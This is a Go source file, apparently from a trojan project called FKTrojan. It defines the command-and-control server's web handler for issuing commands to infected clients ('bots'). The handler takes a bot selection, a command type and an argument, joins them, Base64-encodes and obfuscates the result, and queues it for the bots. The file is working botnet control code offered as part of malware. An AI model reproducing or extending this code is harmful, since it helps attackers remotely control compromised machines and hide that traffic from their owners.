/*
Author: FreeKnight
*/
//------------------------------------------------------------
package server

//------------------------------------------------------------
import (
	"FKTrojan/common"
	"fmt"
	"net/http"
	"strings"
)

//------------------------------------------------------------
func SendCommandHandler(response http.ResponseWriter, request *http.Request) {
	if isEnabled {
		userName := GetUserName(request)
		if userName != "" {
			request.ParseForm()
			var guidList []string
			guidList = request.Form["selectedbot"]             // 选择的客户端列表
			botSelection := request.FormValue("botsselection") // 全部客户端？还是客户端列表中的客户端
			commandType := request.FormValue("commandtype")    // 命令类型
			arguments := request.FormValue("arg1")             // 命令参数
			if botSelection == "" || commandType == "" || arguments == "" {
				r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Somethings not right...")
				result := r.Replace(ErrorHTML)
				fmt.Fprintf(response, result)
			} else {
				var tmpguidlist string

				if botSelection == "000" {
					tmpguidlist = "000"
				} else {
					for _, guid := range guidList {
						tmpguidlist += guid + ","
					}
				}
				tmpstring := tmpguidlist + "|" + commandType + "|" + arguments
				done := setCommand(common.Obfuscate(common.Base64Encode(tmpstring)))
				if done {
					r := strings.NewReplacer("{STATS}", createcountDiv(), "{MESSAGE}", "Command Issued!")
					result := r.Replace(SuccessHTML)
					fmt.Fprintf(response, result)
				} else {
					r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Issuing Command")
					result := r.Replace(ErrorHTML)
					fmt.Fprintf(response, result)
				}
			}
		} else {
			fmt.Fprintf(response, LoginHTML)
		}
	}
}

//------------------------------------------------------------
